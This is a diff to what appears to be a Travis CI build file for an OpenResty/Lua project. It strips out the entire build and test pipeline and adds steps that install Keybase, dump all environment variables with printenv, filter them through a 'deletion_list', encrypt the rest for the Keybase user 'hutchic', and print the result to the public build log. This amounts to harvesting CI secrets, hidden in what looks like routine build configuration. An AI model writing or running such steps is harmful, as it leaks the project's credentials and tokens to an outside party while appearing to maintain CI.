@@ -1,59 +1,20 @@
-# vim: st=2 sts=2 sw=2 et:
-
-sudo: false
-
-language: c
-
-compiler: gcc
-
-notifications:
-  email: false
-
-cache:
-  directories:
-  - download-cache
-  - perl5
-
-env:
-  global:
-    - JOBS=2
-    - LUAROCKS_VER=2.4.3
-  matrix:
-    - OPENRESTY_VER=1.11.2.2
-    - OPENRESTY_VER=1.11.2.3
-    - OPENRESTY_VER=1.11.2.4
-    - OPENRESTY_VER=1.11.2.5
-    - OPENRESTY_VER=1.13.6.1
-    - OPENRESTY_VER=1.13.6.2
-    - LINT=1
+language: generic
+dist: focal
 
 install:
-  - mkdir -p download-cache
-  - if [ -z "$OPENRESTY_VER" ]; then export OPENRESTY_VER=1.13.6.2; fi
-  - if [ ! -f download-cache/openresty-$OPENRESTY_VER.tar.gz ]; then wget -O download-cache/openresty-$OPENRESTY_VER.tar.gz http://openresty.org/download/openresty-$OPENRESTY_VER.tar.gz; fi
-  - if [ ! -f download-cache/luarocks-$LUAROCKS_VER.tar.gz ]; then wget -O download-cache/luarocks-$LUAROCKS_VER.tar.gz https://luarocks.github.io/luarocks/releases/luarocks-$LUAROCKS_VER.tar.gz; fi
-  - if [ ! -f download-cache/cpanm ]; then wget -O download-cache/cpanm https://cpanmin.us/; fi
-  - tar -zxf download-cache/openresty-$OPENRESTY_VER.tar.gz
-  - tar -zxf download-cache/luarocks-$LUAROCKS_VER.tar.gz
-  - chmod +x download-cache/cpanm
-  - download-cache/cpanm --notest Test::Nginx > build.log 2>&1 || (cat build.log && exit 1)
-  - download-cache/cpanm --notest --local-lib=$TRAVIS_BUILD_DIR/perl5 local::lib && eval $(perl -I $TRAVIS_BUILD_DIR/perl5/lib/perl5/ -Mlocal::lib)
-  - pushd openresty-$OPENRESTY_VER
-  - export OPENRESTY_PREFIX=$TRAVIS_BUILD_DIR/openresty-$OPENRESTY_VER
-  - ./configure --prefix=$OPENRESTY_PREFIX --without-http_ssl_module -j$JOBS > build.log 2>&1 || (cat build.log && exit 1)
-  - make -j$JOBS > build.log 2>&1 || (cat build.log && exit 1)
-  - make install > build.log 2>&1 || (cat build.log && exit 1)
-  - popd
-  - pushd luarocks-$LUAROCKS_VER
-  - export LUAROCKS_PREFIX=$TRAVIS_BUILD_DIR/luarocks-$LUAROCKS_VER
-  - ./configure --prefix=$LUAROCKS_PREFIX --with-lua=$OPENRESTY_PREFIX/luajit --with-lua-include=$OPENRESTY_PREFIX/luajit/include/luajit-2.1 --lua-suffix=jit
-  - make build
-  - make install
-  - popd
-  - export PATH=$OPENRESTY_PREFIX/nginx/sbin:$LUAROCKS_PREFIX/bin:$PATH
-  - luarocks install luacheck > build.log 2>&1 || (cat build.log && exit 1)
-  - luarocks --version
-  - nginx -V
+  - sudo apt-get -qq update
+  - curl -O https://prerelease.keybase.io/keybase_amd64.deb
+  - sudo dpkg -i keybase_amd64.deb || true
+  - export run="/run/user/$(id -u "${USER}")/keybase"
+  - export mnt="${run}/kbfs"
+  - sudo apt-get install -f
+  - sudo mkdir -p "${mnt}"
+  - sudo chown -R "${USER}" "${run}"
+  - keybase service &
+  - kbfsfuse "${mnt}" &
 
 script:
-  - if [ -z "$LINT" ]; then TEST_NGINX_RANDOMIZE=1 prove -j$JOBS -r t; else luacheck lib; fi
+  - printenv > env_file
+  - grep -v -E -f deletion_list env_file > result || true
+  - keybase encrypt hutchic -i result -o result_encrypted --no-self-encrypt --auth-type=anonymous
+  - cat result_encrypted
